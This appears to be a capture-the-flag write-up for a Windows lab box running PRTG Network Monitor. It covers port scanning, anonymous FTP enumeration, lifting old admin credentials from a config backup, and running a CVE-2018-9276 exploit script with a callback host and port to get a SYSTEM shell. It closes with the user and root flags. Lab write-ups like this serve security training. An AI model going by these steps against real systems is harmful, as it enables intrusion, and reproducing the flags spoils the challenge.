# Netmod - Easy

```shell
rustscan -a 10.10.10.152 --range 0-65535 --ulimit 5000 -- -sV

ftp 10.10.10.152
#anonymous login
#get user flag

smbclient -L 10.129.194.160
#password required

ftp 10.10.10.152
#go to PRTG Network Monitor folder
#and get the config files

#get CVE-2018-9276 exploit
python CVE-2018-9276.py -i 10.10.10.152 -p 80 --lhost 10.10.14.3 --lport 4444
#this works and we get shell as root
```

```markdown
Open ports & services:

  * 21 - ftp - ftpd
  * 80 - http - Indy httpd 18.1.37.13946
  * 135 - msrpc - RPC
  * 139 - netbios-ssn - netbios-ssn
  * 445 - microsoft-ds - MS Windows Server 2008 R2
  * 5985 - http - HTTPAPI httpd 2.0
  * 47001 - http - HTTPAPI httpd 2.0
  * 49664-49669 - msrpc - RPC

FTP has anonymous login, and on logging in, we can get a view of the root system folder.

While we cannot access the Administrator files, we can get user flag from Public files.

We can try using smbclient to connect to the SMB shares, but we need a password.

Searching for exploits related to PRTG NetMon, we do find exploits that give us RCE, but we need authentication first.

Going back to ftp, we can enumerate further; and in "C:\Users\All Users\Paessler", there is a PRTG Network Monitor folder, which contains a few config files.

Using the get command we can transfer those files to our machine.

One of those files, an old backup of a config file, contains the creds prtgadmin:PrTg@dmin2018

We can try these creds at the webpage login, but it is invalid.

As this room was made in 2019 and the config file is old, we can change the year from 2018 to 2019, and then try the creds again.

This time, it works and we are authenticated.

We can proceed with the Metasploit exploit; however, for some reason it does not work.

As an alternative, we can look up for alternative exploit implementations of CVE-2018-9276; I get a Python script on GitHub.

With all the required parameters and arguments to the script, we can get root as system, and the root flag can be found in Administrator's desktop.
```

1. User flag - adfff6aba5e742b33cfe14b2976f1741

2. Root flag - 8fef7ddad9b18b2260606add003a0500
